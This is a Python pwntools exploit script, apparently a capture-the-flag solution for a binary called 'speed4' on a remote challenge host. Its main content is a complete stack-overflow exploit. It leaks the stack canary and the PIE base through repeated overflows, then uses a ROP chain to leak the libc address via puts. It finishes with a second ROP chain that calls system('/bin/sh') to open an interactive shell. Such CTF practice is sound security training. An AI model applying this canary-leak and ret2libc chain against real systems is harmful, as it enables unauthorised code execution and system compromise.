#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host speed-04.hfsc.tf --port 34500 speed4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('speed4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'speed-04.hfsc.tf'
port = int(args.PORT or 34500)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc6_2.31-0ubuntu9.7_amd64.so')

io = start()

padding = b'a' * (0x50 - 0x8 + 1)
io.sendafter(b"b0f: ", padding + b'\x0d')
io.recvuntil(padding)

canary = unpack((b'\x00' + io.recvuntil(b"\n", drop=True)).ljust(8, b'\x00'))
io.info("CANARY: " + hex(canary))

padding = b'a' * (0x50 + 0x8)
io.sendafter(b"b0f: ", padding + b'\x0d')
io.recvuntil(padding)

exe.address = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')) - 0x1380
io.info("EXE: " + hex(exe.address))

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.raw(rop.ret)
rop.call(exe.address + 0x00001454)

io.info(rop.dump())

payload = flat({
    0x50 - 0x8: canary,
    0x50: exe.address + 0x4e00,
    0x50 + 0x8: rop.chain(),
    })

io.sendafter(b"b0f: ", payload + b'\x0d')

io.sendafter(b"b0f: ", b'\x0d')

libc.address = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')) - libc.sym['puts']
io.info("LIBC: " + hex(libc.address))

rop = ROP(libc)
rop.raw(rop.ret)
rop.call(libc.sym['system'], [next(libc.search(b"/bin/sh"))])

io.info(rop.dump())

payload = flat({
    0x50 - 0x8: canary,
    0x50: exe.address + 0x4700,
    0x50 + 0x8: rop.chain(),
    })

io.sendafter(b"b0f: ", payload + b'\x0d')

io.sendafter(b"b0f: ", b'\x0d')

io.interactive()
